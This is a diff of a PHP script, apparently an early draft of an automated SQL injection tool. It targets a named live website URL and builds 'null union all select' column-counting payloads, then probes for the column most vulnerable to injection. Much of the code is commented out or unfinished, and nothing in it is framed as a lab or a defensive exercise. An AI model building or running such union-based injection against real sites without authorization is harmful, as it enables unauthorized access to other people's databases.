@@ -1,4 +1,9 @@
 <?php
+$url = "http://www.bible-history.com/subcat.php?id=22";
+/**
+ *Returns SQL error
+ *	
+ */
 /*
 function getError($url)
 {
@@ -17,8 +22,11 @@ function getError($url)
 }
 var_dump(getError("http://www.bible-history.com/subcat.php?id=22"));
 */
-
-$url = "http://www.bible-history.com/subcat.php?id=22";
+/*
+ *Returns total number of columns
+ *
+ */
+/*
 $column = 1;
 
 if ($column == 1)
@@ -31,6 +39,28 @@ if ($column == 1)
 $column--;
 $getRange = implode (",", range (1,$column));
 $shortUrl = substr_replace($url, "" ,-2);
-$getColumn = $shortUrl . chr(8)."null union all select " . $getRange . "--";
+$getColumn = $shortUrl . "null union all select " . $getRange . "--";
 var_dump($getColumn);
+*/
+/**
+ *Returns column number that is most vulnerable to injection 
+ *
+ */
+/*
+$test = substr_replace($url, "" ,-2);
+$test = $test . "null";
+$contents = file_get_contents($test);
+$occurence = "get first occurence to inject code into to";
+
+if (strpos($contents, $occurence) !== FALSE)
+{
+	echo 'found';
+	//replace $occurence with selected injection into URL
+}
+else
+{
+
+	echo "not found";
+}
+*/
 ?>
